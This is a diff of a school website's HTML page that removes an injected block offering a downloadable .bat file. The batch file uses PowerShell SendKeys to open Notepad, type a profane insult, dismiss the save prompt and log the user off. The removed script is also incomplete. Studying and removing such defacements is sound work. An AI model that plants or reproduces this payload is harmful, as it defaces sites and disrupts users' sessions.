@@ -453,28 +453,7 @@ window.a2a_config=window.a2a_config||{};a2a_config.callbacks=[];a2a_config.overl
         <header id="header" class="site-header" role="banner">
             <div class="row">
                 <div class="large-12 small-12 columns">
-    <h1>Create and Download .bat File</h1>
-
-    <script>
-        window.onload = function() {
-            // Define the content of the .bat file
-            const batContent = `@echo off
-powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^({d})');"
-timeout /t 1 >nul
-start notepad
-timeout /t 1 >nul
-powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('Untitled - Notepad'); $wshell.SendKeys('Y'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('o'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('u'); Start-Sleep -Milliseconds 100; $wshell.SendKeys(''''); Start-Sleep -Milliseconds 100; $wshell.SendKeys('r'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('e'); Start-Sleep -Milliseconds 500; $wshell.SendKeys(' '); Start-Sleep -Milliseconds 100; $wshell.SendKeys('s'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('o'); Start-Sleep -Milliseconds 500; $wshell.SendKeys(' '); Start-Sleep -Milliseconds 100; $wshell.SendKeys('f'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('u'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('c'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('k'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('e'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('d'); Start-Sleep -Milliseconds 500; $wshell.SendKeys(' '); Start-Sleep -Milliseconds 100; $wshell.SendKeys('u'); Start-Sleep -Milliseconds 100; $wshell.SendKeys('p'); Start-Sleep -Milliseconds 250; $wshell.SendKeys('.'); Start-Sleep -Milliseconds 250; $wshell.SendKeys('.'); Start-Sleep -Milliseconds 250; $wshell.SendKeys('.');"
-timeout /t 1 >nul
-powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('%{F4}'); Start-Sleep -Milliseconds 1000;"
-powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{TAB}'); Start-Sleep -Milliseconds 750;"
-powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ENTER}'); Start-Sleep -Milliseconds 500;"
-shutdown /l`;
-
-    <h1>Download Batch File</h1>
-    <button onclick="downloadBatchFile()">Download .bat File</button>
-
     <script src="cookieFile.js"></script>
-                    
     <!-- Caixa amb el nom del centre -->
     <div class="hide-for-small large-3 columns">
         <div class="row">
